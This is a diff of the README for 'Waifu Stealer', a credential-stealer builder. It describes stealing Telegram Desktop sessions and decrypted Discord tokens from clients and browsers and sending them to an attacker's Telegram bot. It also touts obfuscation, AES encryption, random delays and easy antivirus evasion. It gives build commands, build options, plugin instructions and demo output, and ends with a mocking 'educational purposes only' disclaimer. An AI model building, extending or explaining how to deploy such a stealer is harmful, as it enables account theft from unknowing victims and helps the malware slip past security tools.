@@ -1,13 +1,14 @@
 # Waifu Stealer
 
-Stealer builder. Easily extensible with plugins (Discord and Telegram plugins are provided).
+Stealer builder with a powerful plugins system (Discord and Telegram plugins are provided).
 
 ## Features
 
-- Steal Telegram Desktop sessions (if target has a local password, the data will be encrypted)
-- Steal Discord tokens from clients (and decrypt them) and browsers (every profiles)
 - Source is highly obfuscated using [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
+- Source is encrypted using `AES-256-GCM`
 - Output binary is packaged to a single portable binary using [pkg](https://github.com/vercel/pkg)
+- Steal Telegram Desktop sessions (if target has a local password, you need it to unlock the session)
+- Steal Discord tokens from clients (and decrypt them) and browsers (every profiles)
 - Send data to Telegram using webhooks
 
 Included Plugins:
@@ -15,31 +16,43 @@ Included Plugins:
 - [Telegram Stealer](https://github.com/rigwild/telegram-stealer) - Steal Telegram Desktop sessions
 - [Discord Stealer](https://github.com/rigwild/discord-stealer) - Steal Discord tokens from clients and browsers
 
+Because Node.js is an interpreted language, this is very stealth. You can easily bypass AVs. I will not give advice on how to do this, though 😉.
+
+## Caveats
+
+As this project uses Node.js, its binary need to be included. Therefore, the executable is huge (+35 MB). Trying to pack with UPX breaks the executable 😕.
+
+If you know a tool similar to [pkg](https://github.com/vercel/pkg) that would download the Node.js binary at runtime instead of bundling it (to generate a small binary), [create a discussion](https://github.com/rigwild/waifu-stealer/discussions/new)!
+
 ## Demo
 
+![Telegram logs screenshot](./screenshot.webp)
+
 ```
-PS C:\Users\x\Desktop\waifu-stealer> node .\builder.js 12345678 12345678:45545duuyESn3GFZfeefezfzfrehgte515tcr3EsaK65D3I
-Obfuscated entrypoint to C:\Users\x\Desktop\waifu-stealer\obfuscated\index.js
-Obfuscated plugin [discord-stealer-plugin] to C:\Users\x\Desktop\waifu-stealer\obfuscated\plugins\discord-stealer-plugin\lib.js
-Obfuscated plugin [telegram-stealer-plugin] to C:\Users\x\Desktop\waifu-stealer\obfuscated\plugins\telegram-stealer-plugin\lib.js
+PS C:\Users\x\waifu-stealer> node builder.js --chatId=12345678 --token=12345678:45545duuyESn3GFZfeefezfzfrehgte515tcr3EsaK65D3I --debug --no-random-delays
+
+Replaced dynamic imports with explicit static imports
+Copied entrypoint and plugins to C:\Users\x\waifu-stealer\obfuscated
+Obfuscated entrypoint to C:\Users\x\waifu-stealer\obfuscated\index.js
+Obfuscated plugin [discord-stealer-plugin] to C:\Users\x\waifu-stealer\obfuscated\plugins\discord-stealer-plugin\lib.js
+Obfuscated plugin [telegram-stealer-plugin] to C:\Users\x\waifu-stealer\obfuscated\plugins\telegram-stealer-plugin\lib.js
+Bundled entrypoint and plugins together
+Encrypted bundle to C:\Users\x\waifu-stealer\obfuscated\index.js
+Obfuscated the decryptor to C:\Users\x\waifu-stealer\obfuscated\index.js
+Copying native modules:
+  C:\Users\x\waifu-stealer\node_modules\win-dpapi\build\Release\node-dpapi.node
+Done! ✌️
 
 
-PS C:\Users\x\Desktop\waifu-stealer> npm run pkg-windows
+PS C:\Users\x\waifu-stealer> npm run pkg-windows
 
 > pkg-windows
 > pkg --targets node18-win-x64 --compress GZip --output hello.exe obfuscated/package.json
 
 > pkg@5.8.0
 compression:  GZip
-> Warning Cannot resolve '_0x13cdd0.resolve(_0x30306b, _0xd27ee5.name, 'lib.js')'
-  C:\Users\x\Desktop\waifu-stealer\obfuscated\index.js
-  Dynamic require may fail at run time, because the requested file
-  is unknown at compilation time and not included into executable.
-  Use a string literal as an argument for 'require', or leave it
-  as is and specify the resolved file name in 'scripts' option.
 
-
-PS C:\Users\x\Desktop\waifu-stealer> .\hello.exe
+PS C:\Users\x\waifu-stealer> .\hello.exe
 Welcome to Waifu Stealer!
 HWID: xxxxxxxxxxxxxxxxxxxxxxx1234567890
 Loading plugins...
@@ -112,10 +125,10 @@ Every plugin finished executing! 🎉
 
 ## System compatibility
 
-| Plugin                     | Windows | Linux / MacOS |
-| -------------------------- | :-----: | :-----------: |
-| Telegram Desktop           |   ✅    |      ✅       |
-| Discord Clients & Browsers |   ✅    |      ❌       |
+| Plugin             | Windows | Linux / MacOS |
+| ------------------ | :-----: | :-----------: |
+| `telegram-stealer` |   ✅    |      ✅       |
+| `discord-stealer`  |   ✅    |      ❌       |
 
 ## Build
 
@@ -144,12 +157,15 @@ npm install --dev
 
 ### Generate binary
 
-```sh
-# Obfuscate the code
-npm run build <telegram_chat_id> <telegram_token> <add_random_delay_often_(true_false)>
+- `chatId`: Telegram chat ID
+- `token`: Telegram bot token
+- `debug`: Debug mode (prints more info)
+- `no-random-delays`: Do not wait (if not provided, the script will randomly wait between 5 and 35 seconds before running and before starting each plugin)
+- `disabled-plugins`: Comma-separated list of plugins to disable (i.e. `discord-stealer-plugin,telegram-stealer-plugin`)
 
-# If for some reason your stealer does not work, activate the logs
-npm run build 12345 112346861:fekoOPKLkouuyESn3GM5zefze252153e15fze true SHOW_LOGS
+```sh
+# Obfuscate and encrypt the code
+npm run build --chatId=<telegram_chat_id> --token=<telegram_token> [--no-random-delays] [--disabled-plugins=<plugin1,plugin2,...>] [--debug]
 
 # Generate the binary
 npm run pkg-windows
@@ -173,7 +189,7 @@ npm install --dev
 
 Your `lib.js` file must export a function called `run`, which will be awaited.
 
-The string returned by your `run` function will get sent to the Telegram chat (returning a string is optional).
+The data returned by your `run` function will get sent to the Telegram chat (string: sent as is, object: JSON prettified in a code block), returning is optional.
 
 Provided functions:
 
@@ -208,5 +224,11 @@ module.exports = { run }
 **Note:** Do not use ESM as [pkg](https://github.com/vercel/pkg) does not support it.
 
 ## License
+
+This is for educational purposes only, to understand how malwares work.
+
+Do not use it maliciously or on any machines that you do not have the permission for(🤔). Be gentle, my dear, and don't hurt anyone.
+
+I am not responsible for any harm you do with this shit, bruh, let me breath.
 
 [The MIT license](./LICENSE)
